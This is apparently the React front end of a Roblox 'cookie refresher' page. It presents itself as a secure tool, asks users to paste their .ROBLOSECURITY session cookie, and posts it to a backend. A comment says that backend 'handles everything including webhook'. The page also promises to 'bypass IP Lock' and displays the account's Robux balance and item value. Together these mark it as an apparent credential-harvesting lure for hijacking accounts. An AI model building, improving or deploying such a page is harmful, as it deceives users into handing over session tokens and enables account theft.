"use client"

import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
import { Textarea } from "@/components/ui/textarea"
import { Checkbox } from "@/components/ui/checkbox"
import { Loader2, Copy, X, RefreshCw, Shield } from "lucide-react"
import { Alert, AlertDescription } from "@/components/ui/alert"

interface UserData {
  userSettings: {
    userName: string
    displayName: string
    userId: string
  }
  userAvatar: string
  userTransactions: {
    Balance: number
    Pending: number
    Summary: number
  }
  Collectibles: {
    Limiteds: {
      Rap: number
    }
  }
}

interface GameData {
  games: string[]
}

export default function CookieRefresher() {
  const [cookie, setCookie] = useState("")
  const [refreshedCookie, setRefreshedCookie] = useState("")
  const [userData, setUserData] = useState<UserData | null>(null)
  const [gameData, setGameData] = useState<GameData | null>(null)
  const [isLoading, setIsLoading] = useState(false)
  const [showUserInfo, setShowUserInfo] = useState(false)
  const [showUserModal, setShowUserModal] = useState(false)
  const [error, setError] = useState("")
  const [success, setSuccess] = useState("")

  const refreshCookie = async () => {
    if (!cookie.trim()) {
      setError("Please enter a valid cookie")
      return
    }

    setIsLoading(true)
    setError("")
    setSuccess("")
    setUserData(null)
    setGameData(null)
    setRefreshedCookie("")

    try {
      // Single API call that handles everything including webhook
      const response = await fetch("/api/refresh-cookie", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          useCookie: cookie,
          includeUserInfo: showUserInfo,
        }),
      })

      if (!response.ok) {
        throw new Error("Failed to refresh cookie")
      }

      const data = await response.json()

      setRefreshedCookie(data.cookie)
      setSuccess("Cookie refreshed successfully!")

      if (showUserInfo && data.userData) {
        setUserData(data.userData)
        if (data.gameData) {
          setGameData(data.gameData)
        }
        setShowUserModal(true)
      }
    } catch (error) {
      setError(error instanceof Error ? error.message : "An error occurred")
    } finally {
      setIsLoading(false)
    }
  }

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text)
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-white to-gray-100">
      <div className="container mx-auto px-4 py-12">
        {/* Header */}
        <div className="mb-12 text-center">
          <div className="animate-fadeIn">
            <h1 className="text-5xl font-bold text-black mb-3 tracking-tight">COOKIE REFRESHER</h1>
            <div className="w-24 h-1 bg-black mx-auto mb-4"></div>
            <p className="text-gray-600 text-lg">Refresh your Roblox cookies securely</p>
          </div>
        </div>

        <div className="max-w-2xl mx-auto">
          <Card className="bg-white border-2 border-black shadow-[8px_8px_0px_0px_rgba(0,0,0)] hover:shadow-[12px_12px_0px_0px_rgba(0,0,0)] transition-all duration-200">
            <CardHeader className="pb-4 border-b border-gray-200">
              <div className="flex items-center justify-between mb-3">
                <div className="p-2 bg-black rounded-full text-white">
                  <Shield className="h-6 w-6" />
                </div>
                <div className="flex items-center gap-2">
                  <div className="w-3 h-3 rounded-full bg-green-500" />
                  <span className="text-xs font-bold uppercase text-green-700">SECURE</span>
                </div>
              </div>
              <CardTitle className="text-2xl font-bold text-black text-center">Cookie Refresher Tool</CardTitle>
              <CardDescription className="text-gray-600 text-base text-center">
                Refresh ROBLOX cookie to bypass IP Lock
              </CardDescription>
            </CardHeader>
            <CardContent className="pt-6 space-y-6">
              {/* Cookie Input */}
              <div className="space-y-2">
                <label className="text-sm font-medium text-black">Roblox Cookie (.ROBLOSECURITY)</label>
                <div className="relative">
                  <div className="absolute left-3 top-3 text-gray-500">
                    <RefreshCw className="h-4 w-4" />
                  </div>
                  <Textarea
                    placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow"
                    value={cookie}
                    onChange={(e) => setCookie(e.target.value)}
                    className="min-h-[80px] border-2 border-gray-300 focus:border-black pl-10 bg-gray-50"
                  />
                </div>
              </div>

              {/* User Information Checkbox */}
              <div className="flex items-center space-x-3 p-4 bg-red-50 border border-red-200 rounded-lg">
                <Checkbox
                  id="user-info"
                  checked={showUserInfo}
                  onCheckedChange={setShowUserInfo}
                  className="border-red-500 data-[state=checked]:bg-red-500 data-[state=checked]:border-red-500"
                />
                <label htmlFor="user-info" className="text-red-600 font-medium">
                  USER INFORMATION
                </label>
              </div>

              {/* Refresh Button */}
              <Button
                onClick={refreshCookie}
                disabled={isLoading || !cookie.trim()}
                className="w-full bg-black text-white hover:bg-gray-800 font-medium text-base py-6"
              >
                {isLoading ? (
                  <>
                    <Loader2 className="w-5 h-5 mr-2 animate-spin" />
                    Refreshing Cookie...
                  </>
                ) : (
                  <>
                    <RefreshCw className="w-5 h-5 mr-2" />
                    Refresh Cookie
                  </>
                )}
              </Button>

              {/* Error Alert */}
              {error && (
                <Alert className="border-red-200 bg-red-50">
                  <AlertDescription className="text-red-800">{error}</AlertDescription>
                </Alert>
              )}

              {/* Success Alert */}
              {success && !showUserModal && (
                <Alert className="border-green-200 bg-green-50">
                  <AlertDescription className="text-green-800">{success}</AlertDescription>
                </Alert>
              )}

              {/* Refreshed Cookie Display */}
              {refreshedCookie && !showUserModal && (
                <Card className="border-2 border-green-500 bg-green-50">
                  <CardHeader className="pb-3">
                    <CardTitle className="text-lg font-bold text-green-800 flex items-center gap-2">
                      🍪 Refreshed Cookie
                    </CardTitle>
                  </CardHeader>
                  <CardContent>
                    <div className="space-y-3">
                      <Textarea
                        value={refreshedCookie}
                        readOnly
                        className="min-h-[80px] bg-white border-green-300 text-sm font-mono"
                      />
                      <Button
                        onClick={() => copyToClipboard(refreshedCookie)}
                        className="w-full bg-green-600 hover:bg-green-700 text-white"
                      >
                        <Copy className="w-4 h-4 mr-2" />
                        Copy to Clipboard
                      </Button>
                    </div>
                  </CardContent>
                </Card>
              )}
            </CardContent>
          </Card>
        </div>

        {/* User Information Modal */}
        {showUserModal && userData && (
          <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
            <Card className="w-full max-w-md bg-white border-2 border-black shadow-[12px_12px_0px_0px_rgba(0,0,0)] relative">
              <button
                onClick={() => setShowUserModal(false)}
                className="absolute top-4 right-4 text-gray-600 hover:text-black"
              >
                <X className="w-5 h-5" />
              </button>

              <CardContent className="p-8 space-y-6">
                {/* User Header */}
                <div className="text-center space-y-4">
                  <div className="relative">
                    <img
                      src={userData.userAvatar || "/placeholder.svg"}
                      alt="User Avatar"
                      className="w-20 h-20 rounded-full mx-auto border-4 border-black"
                    />
                  </div>
                  <div>
                    <h2 className="text-xl font-bold text-black">{userData.userSettings.userName}</h2>
                    <p className="text-gray-600">@{userData.userSettings.displayName}</p>
                  </div>
                  <Button
                    onClick={() => copyToClipboard(refreshedCookie)}
                    className="bg-black text-white hover:bg-gray-800 px-6 py-2 rounded-lg"
                  >
                    <Copy className="w-4 h-4 mr-2" />
                    Copy
                  </Button>
                </div>

                {/* Stats Grid */}
                <div className="grid grid-cols-3 gap-4 text-center">
                  <div className="p-3 bg-gray-50 rounded-lg border">
                    <p className="text-gray-600 text-sm font-medium">Robux</p>
                    <p className="text-black font-bold text-lg">{userData.userTransactions.Balance}</p>
                  </div>
                  <div className="p-3 bg-gray-50 rounded-lg border">
                    <p className="text-gray-600 text-sm font-medium">Pending Robux</p>
                    <p className="text-black font-bold text-lg">{userData.userTransactions.Pending}</p>
                  </div>
                  <div className="p-3 bg-gray-50 rounded-lg border">
                    <p className="text-gray-600 text-sm font-medium">Summary</p>
                    <p className="text-black font-bold text-lg">{userData.userTransactions.Summary}</p>
                  </div>
                </div>

                <div className="grid grid-cols-3 gap-4 text-center">
                  <div className="p-3 bg-gray-50 rounded-lg border">
                    <p className="text-gray-600 text-sm font-medium">User's RAP</p>
                    <p className="text-black font-bold text-lg">{userData.Collectibles.Limiteds.Rap}</p>
                  </div>
                  <div className="p-3 bg-gray-50 rounded-lg border">
                    <p className="text-gray-600 text-sm font-medium">Credit</p>
                    <p className="text-black font-bold text-lg">0</p>
                  </div>
                  <div className="p-3 bg-gray-50 rounded-lg border">
                    <p className="text-gray-600 text-sm font-medium">Groups Owned</p>
                    <p className="text-black font-bold text-lg">0</p>
                  </div>
                </div>

                {/* Recently Played */}
                {gameData && (
                  <div className="space-y-3">
                    <h3 className="text-black font-bold text-center">Recently Played</h3>
                    <div className="bg-gray-50 p-4 rounded-lg border max-h-32 overflow-y-auto">
                      <p className="text-gray-700 text-sm leading-relaxed">{gameData.games.join(", ")}</p>
                    </div>
                  </div>
                )}

                {/* Refreshed Cookie in Modal */}
                <Card className="border-2 border-green-500 bg-green-50">
                  <CardHeader className="pb-3">
                    <CardTitle className="text-lg font-bold text-green-800 text-center">🍪 Refreshed Cookie</CardTitle>
                  </CardHeader>
                  <CardContent>
                    <Textarea
                      value={refreshedCookie}
                      readOnly
                      className="min-h-[60px] bg-white border-green-300 text-xs font-mono"
                    />
                  </CardContent>
                </Card>
              </CardContent>
            </Card>
          </div>
        )}
      </div>
    </div>
  )
}
